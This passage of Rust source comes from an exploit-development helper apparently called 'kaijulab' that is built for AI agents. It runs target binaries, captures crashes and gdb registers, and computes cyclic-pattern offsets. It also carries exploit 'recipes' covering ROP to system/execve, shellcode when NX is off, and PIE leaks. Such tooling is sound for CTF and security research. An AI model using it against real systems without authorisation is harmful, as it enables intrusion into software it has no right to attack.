    let raw = std::env::current_exe().unwrap_or_else(|_| PathBuf::from("kaijulab"));
    let path = raw.canonicalize().unwrap_or(raw);
    if path
        .components()
        .any(|component| component.as_os_str() == "debug")
    {
        if let Some(root) = std::env::current_dir().ok().filter(|dir| dir.join("Cargo.toml").exists())
        {
            let release = root.join("target/release/kaijulab");
            if release.exists() {
                return shell_quote(&release.to_string_lossy());
            }
        }
    }
    shell_quote(&path.to_string_lossy())
}

fn gdb_quote(s: &str) -> String {
    if s.chars()
        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '-' | '.' | '/' | ':' | '='))
    {
        s.to_string()
    } else {
        shell_quote(s)
    }
}

fn read_input_spec(spec: Option<&str>) -> Result<Option<Vec<u8>>> {
    let Some(spec) = spec else {
        return Ok(None);
    };
    if let Some(path) = spec.strip_prefix('@') {
        Ok(Some(std::fs::read(path)?))
    } else {
        Ok(Some(spec.as_bytes().to_vec()))
    }
}

fn run_captured(
    mut cmd: Command,
    stdin_bytes: Option<&[u8]>,
    timeout_secs: u64,
    max_stream: u64,
) -> Result<serde_json::Value> {
    let timeout = Duration::from_secs(timeout_secs.clamp(1, 300));
    let start = Instant::now();
    let program = format!("{:?}", cmd);
    let mut child = match cmd.spawn() {
        Ok(child) => child,
        Err(e) => {
            return Ok(serde_json::json!({
                "command": program,
                "spawn_error": e.to_string(),
                "timed_out": false,
                "duration_ms": start.elapsed().as_millis(),
                "exit_code": null,
                "signal": null,
                "stdout": "",
                "stderr": "",
                "stdout_truncated": false,
                "stderr_truncated": false,
            }));
        }
    };
    if let Some(input) = stdin_bytes {
        if let Some(mut stdin) = child.stdin.take() {
            let _ = stdin.write_all(input);
        }
    }
    let stdout = child.stdout.take().expect("stdout piped");
    let stderr = child.stderr.take().expect("stderr piped");
    let stdout_thread = std::thread::spawn(move || read_limited(stdout, max_stream));
    let stderr_thread = std::thread::spawn(move || read_limited(stderr, max_stream));

    let (timed_out, status) = loop {
        if let Some(status) = child.try_wait()? {
            break (false, Some(status));
        }
        if start.elapsed() >= timeout {
            #[cfg(unix)]
            unsafe {
                libc::killpg(child.id() as i32, libc::SIGKILL);
            }
            #[cfg(not(unix))]
            {
                let _ = child.kill();
            }
            let status = child.wait().ok();
            break (true, status);
        }
        std::thread::sleep(Duration::from_millis(50));
    };

    let stdout = stdout_thread.join().unwrap_or_default();
    let stderr = stderr_thread.join().unwrap_or_default();
    let stdout_text = String::from_utf8_lossy(&stdout).into_owned();
    let stderr_text = String::from_utf8_lossy(&stderr).into_owned();
    #[cfg(unix)]
    let signal = {
        use std::os::unix::process::ExitStatusExt;
        status.and_then(|s| s.signal())
    };
    #[cfg(not(unix))]
    let signal: Option<i32> = None;

    Ok(serde_json::json!({
        "command": program,
        "timed_out": timed_out,
        "duration_ms": start.elapsed().as_millis(),
        "exit_code": status.and_then(|s| s.code()),
        "signal": signal,
        "stdout": stdout_text,
        "stderr": stderr_text,
        "stdout_truncated": stdout.len() as u64 >= max_stream,
        "stderr_truncated": stderr.len() as u64 >= max_stream,
    }))
}

fn runtime_next_action(output: &serde_json::Value) -> &'static str {
    let stderr = output.get("stderr").and_then(|v| v.as_str()).unwrap_or("");
    if output
        .get("timed_out")
        .and_then(|v| v.as_bool())
        .unwrap_or(false)
    {
        "Target timed out; add stdin/argv fixture or probe with gdb breakpoints."
    } else if stderr.contains("No such file or directory") || stderr.contains("not found") {
        "Resolve missing loader/library with exploit-context runtime notes or qemu -L sysroot."
    } else if output
        .get("stdout_truncated")
        .and_then(|v| v.as_bool())
        .unwrap_or(false)
        || output
            .get("stderr_truncated")
            .and_then(|v| v.as_bool())
            .unwrap_or(false)
    {
        "Output hit the capture limit; rerun with terminating stdin/argv or a shorter timeout before treating any signal as target-controlled."
    } else if output.get("signal").and_then(|v| v.as_i64()).is_some() {
        "Crash observed; run debug-probe with same input to capture registers/backtrace."
    } else {
        "Use observed stdout/stderr to refine IR targets or candidate PoC predicate."
    }
}

fn extract_gdb_signals(text: &str) -> Vec<String> {
    [
        "SIGSEGV", "SIGILL", "SIGABRT", "SIGBUS", "SIGFPE", "SIGTRAP",
    ]
    .iter()
    .filter(|sig| text.contains(**sig))
    .map(|sig| (*sig).to_string())
    .collect()
}

fn register_command_for_arch(arch: Option<&str>) -> String {
    let regs = match arch.unwrap_or(host_arch_label()) {
        "i386" => "eax ebx ecx edx esi edi ebp esp eip eflags",
        "x86_64" => "rax rbx rcx rdx rsi rdi rbp rsp rip eflags r8 r9 r10 r11 r12 r13 r14 r15",
        "aarch64" => "x0 x1 x2 x3 x4 x5 x6 x7 x8 x9 x10 x11 x12 x13 x14 x15 x29 x30 sp pc cpsr",
        "arm" => "r0 r1 r2 r3 r4 r5 r6 r7 r8 r9 r10 r11 r12 sp lr pc cpsr",
        _ => "",
    };
    if regs.is_empty() {
        "info registers".to_string()
    } else {
        format!("info registers {regs}")
    }
}

fn parse_gdb_registers(text: &str) -> serde_json::Value {
    let mut out = serde_json::Map::new();
    for line in text.lines() {
        let mut parts = line.split_whitespace();
        let Some(name) = parts.next() else {
            continue;
        };
        let Some(value) = parts.next() else {
            continue;
        };
        if is_register_name(name) && value.starts_with("0x") {
            out.insert(name.to_string(), serde_json::json!(value));
        }
    }
    serde_json::Value::Object(out)
}

fn is_register_name(name: &str) -> bool {
    matches!(
        name,
        "eax"
            | "ebx"
            | "ecx"
            | "edx"
            | "esi"
            | "edi"
            | "ebp"
            | "esp"
            | "eip"
            | "eflags"
            | "rax"
            | "rbx"
            | "rcx"
            | "rdx"
            | "rsi"
            | "rdi"
            | "rbp"
            | "rsp"
            | "rip"
            | "r8"
            | "r9"
            | "r10"
            | "r11"
            | "r12"
            | "r13"
            | "r14"
            | "r15"
            | "x0"
            | "x1"
            | "x2"
            | "x3"
            | "x4"
            | "x5"
            | "x6"
            | "x7"
            | "x8"
            | "x9"
            | "x10"
            | "x11"
            | "x12"
            | "x13"
            | "x14"
            | "x15"
            | "x29"
            | "x30"
            | "sp"
            | "pc"
            | "lr"
            | "cpsr"
    )
}

fn parse_int(s: &str) -> Result<u64> {
    let s = s.trim();
    if let Some(hex) = s.strip_prefix("0x").or_else(|| s.strip_prefix("0X")) {
        Ok(u64::from_str_radix(hex, 16)?)
    } else {
        Ok(s.parse::<u64>()?)
    }
}

fn tool_text_json(output: String) -> serde_json::Value {
    serde_json::json!({
        "ok": !output.starts_with("Error:"),
        "text": output,
    })
}

fn cyclic_pattern(len: usize) -> String {
    let a = b"abcdefghijklmnopqrstuvwxyz";
    let b = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    let c = b"0123456789";
    let mut out = Vec::with_capacity(len);
    'outer: for &x in a {
        for &y in b {
            for &z in c {
                for ch in [x, y, z] {
                    if out.len() >= len {
                        break 'outer;
                    }
                    out.push(ch);
                }
            }
        }
    }
    String::from_utf8(out).unwrap_or_default()
}

fn cyclic_find_offset(pattern: &str, needle: &str) -> Option<usize> {
    let mut needles = Vec::new();
    needles.push(needle.as_bytes().to_vec());
    let trimmed = needle.trim();
    if let Some(hex) = trimmed
        .strip_prefix("0x")
        .or_else(|| trimmed.strip_prefix("0X"))
    {
        if let Ok(value) = u64::from_str_radix(hex, 16) {
            needles.push((value as u32).to_le_bytes().to_vec());
            needles.push(value.to_le_bytes().to_vec());
        }
    }
    if let Ok(value) = trimmed.parse::<u64>() {
        needles.push((value as u32).to_le_bytes().to_vec());
        needles.push(value.to_le_bytes().to_vec());
    }
    let bytes = pattern.as_bytes();
    needles
        .into_iter()
        .filter(|n| !n.is_empty())
        .find_map(|needle| find_bytes(bytes, &needle))
}

fn exploit_recipes(arch: &str, protections: Option<&serde_json::Value>) -> Vec<serde_json::Value> {
    let nx = protections
        .and_then(|p| p.get("nx"))
        .and_then(|v| v.as_bool())
        .unwrap_or(true);
    let pie = protections
        .and_then(|p| p.get("pie"))
        .and_then(|v| v.as_bool())
        .unwrap_or(false);
    let mut recipes = Vec::new();
    recipes.push(serde_json::json!({
        "name": "offset discovery",
        "steps": ["send cyclic pattern", "debug-probe crash", "cyclic-find overwritten PC/register"],
    }));
    if nx {
        recipes.push(serde_json::json!({
            "name": "ROP/syscall",
            "when": "NX enabled",
            "steps": ["use gadget_hints and PLT/GOT", "control argument registers", "call system/execve/open-read-write"],
        }));
    } else {
        recipes.push(serde_json::json!({
            "name": "shellcode",
            "when": "NX disabled",
            "steps": ["place shellcode in controlled buffer", "redirect PC to buffer"],
        }));
    }
    if pie {
        recipes.push(serde_json::json!({
            "name": "PIE leak",
            "when": "PIE enabled",
            "steps": ["find address leak", "compute image base", "rebase gadgets before final payload"],
        }));
    }
    if arch == "i386" {
        recipes.push(serde_json::json!({
            "name": "i386 syscall",
            "registers": {"eax": "syscall", "ebx": "arg0", "ecx": "arg1", "edx": "arg2"},
        }));
    } else if arch == "x86_64" {
        recipes.push(serde_json::json!({
            "name": "x86_64 syscall",
            "registers": {"rax": "syscall", "rdi": "arg0", "rsi": "arg1", "rdx": "arg2"},
        }));
    }
    recipes
}

fn collect_json_text_hits(
    source: &str,
    value: &serde_json::Value,
    needle_l: &str,
    hits: &mut Vec<serde_json::Value>,
    limit: usize,
) {
    if hits.len() >= limit {
        return;
    }
    match value {
        serde_json::Value::String(s) => {
            if s.to_ascii_lowercase().contains(needle_l) {
                hits.push(serde_json::json!({ "source": source, "text": s }));
            }
        }
        serde_json::Value::Array(items) => {
            for item in items {
                collect_json_text_hits(source, item, needle_l, hits, limit);
                if hits.len() >= limit {
                    break;
                }
            }
        }
        serde_json::Value::Object(map) => {
            for value in map.values() {
                collect_json_text_hits(source, value, needle_l, hits, limit);
                if hits.len() >= limit {
                    break;
                }
            }
        }
        _ => {}
    }
}

fn recommended_next_tool(
    observation: Option<&str>,
    runtime_notes: &serde_json::Value,
    candidate: Option<&Path>,
) -> serde_json::Value {
    if runtime_notes.as_array().map_or(false, |a| !a.is_empty()) {
        return serde_json::json!({
            "command": "exploit-context",
            "reason": "runtime notes contain loader/sysroot blockers; fix execution environment first",
        });
    }
    if let Some(obs) = observation {
        let obs_l = obs.to_ascii_lowercase();
        if obs_l.contains("segmentation fault")
            || obs_l.contains("sigsegv")
            || obs_l.contains("crash")
        {
            return serde_json::json!({
                "command": "debug-probe",
                "reason": "last observation is a crash; capture registers/backtrace and compute control offset",
            });
        }
        if obs_l.contains("timeout") || obs_l.contains("hang") {
            return serde_json::json!({
                "command": "runtime-run",
                "reason": "last observation timed out; reduce fixture and capture stdout/stderr behavior",
            });
        }
    }
    if candidate.is_some() {
        serde_json::json!({
            "command": "exploit-verify",
            "reason": "candidate exists; validate an explicit success predicate",
        })
    } else {
        serde_json::json!({
            "command": "ir-query",
            "reason": "no candidate yet; inspect functions/strings and choose an input-to-control path",
        })
    }
}

async fn run_agent_console(
    base_url: &str,
    token: Option<&str>,
    agent: &str,
    prompt: Option<String>,
    enter: bool,
    idle_timeout_secs: Option<u64>,
    timeout_secs: Option<u64>,
    input_delay_ms: u64,
    interrupt_on_idle: bool,
    cols: u16,
    rows: u16,
) -> Result<()> {
    let url = agent_console_url(base_url, token, agent);
    let (ws, _) = tokio_tungstenite::connect_async(&url).await?;
    let (mut sink, mut stream) = ws.split();

    sink.send(WsMessage::Text(
        serde_json::json!({ "type": "resize", "cols": cols, "rows": rows }).to_string(),
    ))
    .await?;

    if let Some(prompt) = prompt {
        let mut saw_status = false;
        let status_deadline = tokio::time::sleep(Duration::from_secs(3));
        tokio::pin!(status_deadline);
        while !saw_status {
            tokio::select! {
                msg = stream.next() => {
                    match msg {
                        Some(Ok(msg)) => {
                            saw_status = handle_console_message(msg)?;
                            std::io::stdout().flush()?;
                        }
                        Some(Err(e)) => return Err(e.into()),
                        None => break,
                    }
                }
                _ = &mut status_deadline => break,
            }
        }
        if input_delay_ms > 0 {
            tokio::time::sleep(Duration::from_millis(input_delay_ms)).await;
        }

        let needs_enter = enter;
        let prompt_len = prompt.len();
        sink.send(WsMessage::Text(
            serde_json::json!({ "type": "input", "data": prompt }).to_string(),
        ))
        .await?;
        if needs_enter {
            let paste_settle_ms = (1_000_u64 + (prompt_len as u64 / 80) * 25).clamp(1_000, 4_000);
            tokio::time::sleep(Duration::from_millis(paste_settle_ms)).await;
            sink.send(WsMessage::Text(
                serde_json::json!({ "type": "input", "data": "\r" }).to_string(),
            ))
            .await?;
            tokio::time::sleep(Duration::from_millis(250)).await;
            sink.send(WsMessage::Text(
                serde_json::json!({ "type": "input", "data": "\r" }).to_string(),
            ))
            .await?;
        }
        let idle = Duration::from_secs(idle_timeout_secs.unwrap_or(20));
        let mut idle_timer = Box::pin(tokio::time::sleep(idle));
        let max_runtime = Duration::from_secs(timeout_secs.unwrap_or(300));
        let mut runtime_timer = Box::pin(tokio::time::sleep(max_runtime));
        loop {
            tokio::select! {
                msg = stream.next() => {
                    match msg {
                        Some(Ok(msg)) => {
                            if handle_console_message(msg)? {
                                std::io::stdout().flush()?;
                                idle_timer.as_mut().reset(tokio::time::Instant::now() + idle);
                            }
                        }
                        Some(Err(e)) => return Err(e.into()),
                        None => break,
                    }
                }
                _ = &mut idle_timer => {
                    if interrupt_on_idle {
                        sink.send(WsMessage::Text(serde_json::json!({ "type": "interrupt" }).to_string())).await?;
                    }
                    break;
                }
                _ = &mut runtime_timer => {
                    if interrupt_on_idle {
                        sink.send(WsMessage::Text(serde_json::json!({ "type": "interrupt" }).to_string())).await?;
                    }
                    eprintln!("[kaijulab] agent console timeout after {}s", max_runtime.as_secs());
                    break;
                }
            }
        }
        return Ok(());
    }

    let stdin_task = tokio::spawn(async move {
        let mut input = tokio::io::stdin();
        let mut buf = [0_u8; 4096];
        loop {
            match input.read(&mut buf).await {
                Ok(0) => break,
                Ok(n) => {
                    let data = String::from_utf8_lossy(&buf[..n]).into_owned();
                    if sink
                        .send(WsMessage::Text(
                            serde_json::json!({ "type": "input", "data": data }).to_string(),
                        ))
                        .await
                        .is_err()
                    {
                        break;
                    }
                }
                Err(_) => break,
            }
        }
    });

    while let Some(msg) = stream.next().await {
        handle_console_message(msg?)?;
        std::io::stdout().flush()?;
    }
    stdin_task.abort();
    Ok(())
}

async fn reset_agent_console(
    client: &reqwest::Client,
    base_url: &str,
    token: Option<&str>,
    agent: &str,
) {
    let url = api_url(base_url, &format!("/api/agent-console/{agent}"));
    let mut req = client.delete(url);
    if let Some(token) = token {
        req = req.bearer_auth(token);
    }
    let _ = req.send().await;
}

fn handle_console_message(msg: WsMessage) -> Result<bool> {
    match msg {
        WsMessage::Text(text) => {
            if let Ok(value) = serde_json::from_str::<serde_json::Value>(&text) {
                match value.get("type").and_then(|v| v.as_str()) {
                    Some("output") => {
                        if let Some(data) = value.get("data").and_then(|v| v.as_str()) {
                            print!("{data}");
                            return Ok(!data.is_empty());
                        }
                    }
                    Some("error") => {
                        if let Some(data) = value.get("data").and_then(|v| v.as_str()) {
                            eprintln!("[kaijulab] agent console error: {data}");
                            return Ok(true);
                        }
                    }
                    Some("status") => {
                        if let Some(data) = value.get("data") {
                            let agent = data
                                .get("agent")
                                .and_then(|v| v.as_str())
                                .unwrap_or("agent");
                            let command =
                                data.get("command").and_then(|v| v.as_str()).unwrap_or("");
                            let running = data
                                .get("running")
                                .and_then(|v| v.as_bool())
                                .unwrap_or(false);
                            eprintln!(
                                "[kaijulab] {agent} console {}: {command}",
                                if running { "running" } else { "stopped" }
                            );
                            return Ok(true);
                        }
                    }
                    _ => {}
                }
            } else {
                print!("{text}");
                return Ok(!text.is_empty());
            }
        }
        WsMessage::Binary(bytes) => {
            std::io::stdout().write_all(&bytes)?;
            return Ok(!bytes.is_empty());
        }
        WsMessage::Close(_) => return Ok(false),
        _ => {}
    }
    Ok(false)
}

fn agent_console_url(base_url: &str, token: Option<&str>, agent: &str) -> String {
    let mut base = base_url.trim_end_matches('/').to_string();
    if let Some(rest) = base.strip_prefix("https://") {
        base = format!("wss://{rest}");
    } else if let Some(rest) = base.strip_prefix("http://") {
        base = format!("ws://{rest}");
    }
    let mut url = format!("{base}/api/agent-console/{agent}");
    if let Some(token) = token {
        let encoded = token
            .bytes()
            .flat_map(|b| match b {
                b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                    vec![b as char]
                }
                _ => format!("%{b:02X}").chars().collect(),
            })
            .collect::<String>();
        url.push_str("?token=");
        url.push_str(&encoded);
    }
    url
}

fn setup_mcp_hook(output: &Path, command: Option<PathBuf>) -> Result<()> {
    let raw_command = command.unwrap_or(std::env::current_exe()?);
    let command = raw_command
        .canonicalize()
        .unwrap_or_else(|_| raw_command.clone());

    let mut root = if output.exists() {
        let text = std::fs::read_to_string(output)?;
        serde_json::from_str::<serde_json::Value>(&text)?
    } else {
        serde_json::json!({})
    };

    if !root.is_object() {
        anyhow::bail!("{} exists but is not a JSON object", output.display());
    }
    let obj = root.as_object_mut().expect("checked object");
    let servers = obj
        .entry("mcpServers")
        .or_insert_with(|| serde_json::json!({}));
    if !servers.is_object() {
        anyhow::bail!(
            "{}.mcpServers exists but is not a JSON object",
            output.display()
        );
    }
    servers.as_object_mut().expect("checked object").insert(
        "kaijulab".to_string(),
        serde_json::json!({
            "command": command.to_string_lossy(),
            "args": ["mcp"],
        }),
    );

    if let Some(parent) = output.parent().filter(|p| !p.as_os_str().is_empty()) {
        std::fs::create_dir_all(parent)?;
    }
    std::fs::write(
        output,
        format!("{}\n", serde_json::to_string_pretty(&root)?),
    )?;
    println!(
        "Wrote {} with kaijulab MCP command: {} mcp",
        output.display(),
        command.display()
    );
    Ok(())
}
